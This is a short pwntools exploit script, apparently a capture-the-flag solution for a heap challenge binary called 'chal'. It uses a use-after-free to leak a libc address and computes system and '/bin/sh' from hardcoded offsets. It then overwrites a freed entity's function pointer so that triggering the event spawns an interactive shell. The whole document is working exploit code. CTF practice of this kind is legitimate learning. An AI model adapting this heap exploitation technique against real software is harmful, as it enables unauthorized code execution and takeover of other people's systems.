from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10059)
context.arch = 'amd64'

def register(idx, name_len, name):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Nmae Length: ')
    r.send(str(name_len).encode())
    r.recvuntil(b'Name: ')
    r.send(name)

def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())


# Fetch Info
## Leak libc address
register(0, 0x420, b'a')
register(1, 0x420, b'a')
delete(0)
delete(1)
register(0, 0x420, b'a')
trigger_event(0)
r.recvuntil(b'Name: ')
leak_libc = u64(r.recv(6).ljust(0x8, b'\x00'))
libc_base = leak_libc - 0x1ecb61
system_addr = libc_base + 0x52290
log.success(f'Leak libc address = {hex(leak_libc)}')
log.success(f'Libc base address = {hex(libc_base)}')
log.success(f'System address = {hex(system_addr)}')
print(r.recvlines(3))

## Leak heap address
bin_sh_addr = libc_base + 0x00000000001b45bd
### To reset entities
register(0, 0x20, b'a')
register(0, 0x20, b'a')
register(1, 0x20, b'a')
delete(1)
delete(0)
register(0, 0x18, p64(0) + p64(bin_sh_addr) + p64(system_addr))
raw_input()
trigger_event(1)

r.interactive()